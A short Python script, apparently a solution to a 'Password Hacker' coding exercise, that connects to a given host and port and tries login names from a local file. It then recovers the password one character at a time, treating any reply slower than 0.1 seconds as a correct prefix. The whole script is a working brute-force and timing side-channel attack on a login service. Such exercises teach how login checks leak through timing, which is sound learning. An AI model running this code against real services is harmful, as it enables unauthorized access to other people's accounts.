import socket
import argparse
import time
import json

parser = argparse.ArgumentParser(description='Use two arguments')
parser.add_argument('host')
parser.add_argument('port', type=int)
args = parser.parse_args()

symbols = list(map(lambda x: chr(x), range(97, 123))) + list(map(lambda x: chr(x), range(48, 58))) + \
          list(map(lambda x: chr(x), range(65, 91)))
diction_ = dict()


def hack_admin(host, port):
    address = (host, port)
    password = ''
    with socket.socket() as client_socket:
        client_socket.connect(address)
        with open(r"D:\OgLock\python\Password Hacker\Password Hacker\task\hacking\admin_logins.txt", 'r') as file:
            for line in file:
                diction_['login'] = line.rstrip('\n')
                diction_['password'] = ' '
                attempt = json.dumps(diction_)
                client_socket.send(attempt.encode())
                response = client_socket.recv(1024).decode()
                while json.loads(response)['result'] == 'Wrong password!':
                    for symbol in symbols:
                        diction_['password'] = password + symbol
                        attempt = json.dumps(diction_)
                        client_socket.send(attempt.encode())
                        start = time.time()
                        response = client_socket.recv(1024).decode()
                        stop = time.time()
                        if json.loads(response)['result'] == 'Connection success!':
                            return print(json.dumps(diction_))
                        if stop - start > 0.1:
                            password = password + symbol


def main():
    hack_admin(args.host, args.port)


if __name__ == '__main__':
    main()